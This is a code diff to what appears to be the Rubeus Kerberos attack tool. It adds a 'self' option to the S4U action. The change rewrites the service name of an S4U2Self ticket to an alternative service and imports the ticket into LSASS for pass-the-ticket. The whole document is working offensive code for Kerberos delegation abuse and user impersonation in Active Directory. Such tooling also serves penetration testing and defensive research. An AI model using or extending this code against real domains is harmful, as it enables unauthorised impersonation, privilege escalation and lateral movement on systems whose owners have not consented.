@@ -9,7 +9,7 @@ namespace Rubeus
 {
     public class S4U
     {
-        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "")
+        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false)
         {
             // first retrieve a TGT for the user
             byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, new LUID());
@@ -28,9 +28,9 @@ namespace Rubeus
             KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
 
             // execute the s4u process
-            Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, targetDomainController, targetDomain);
+            Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, targetDomainController, targetDomain, self);
         }
-        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "")
+        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool s = false)
         {
             Console.WriteLine("[*] Action: S4U\r\n");
 
@@ -50,7 +50,7 @@ namespace Rubeus
                 }
                 else
                 {
-                    Ticket self = S4U2Self(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService);
+                    Ticket self = S4U2Self(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, s);
                     if (String.IsNullOrEmpty(targetSPN) == false)
                     {
                         S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, self);
@@ -333,7 +333,7 @@ namespace Rubeus
                 Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
             }
         }
-        private static Ticket S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "")
+        private static Ticket S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", bool self = false)
         {
             // extract out the info needed for the TGS-REQ/S4U2Self execution
             string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
@@ -377,6 +377,13 @@ namespace Rubeus
                 // now build the final KRB-CRED structure
                 KRB_CRED cred = new KRB_CRED();
 
+                // if we want to use this s4u2self ticket for authentication, chage the sname
+                if (!String.IsNullOrEmpty(altService) && self)
+                {
+                    rep.ticket.sname.name_string[0] = altService.Split('/')[0];
+                    rep.ticket.sname.name_string.Add(altService.Split('/')[1]);
+                }
+
                 // add the ticket
                 cred.tickets.Add(rep.ticket);
 
@@ -416,6 +423,14 @@ namespace Rubeus
                 info.sname.name_type = encRepPart.sname.name_type;
                 info.sname.name_string = encRepPart.sname.name_string;
 
+                // if we want to use the s4u2self change the sname here too
+                if (!String.IsNullOrEmpty(altService) && self)
+                {
+                    Console.WriteLine("[*] Substituting alternative service name '{0}'", altService);
+                    info.sname.name_string[0] = altService.Split('/')[0];
+                    info.sname.name_string.Add(altService.Split('/')[1]);
+                }
+
                 // add the ticket_info into the cred object
                 cred.enc_part.ticket_info.Add(info);
 
@@ -449,6 +464,12 @@ namespace Rubeus
                     {
                         Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
                     }
+                }
+
+                if (ptt)
+                {
+                    // pass-the-ticket -> import into LSASS
+                    LSA.ImportTicket(kirbiBytes, new LUID());
                 }
 
                 return rep.ticket;
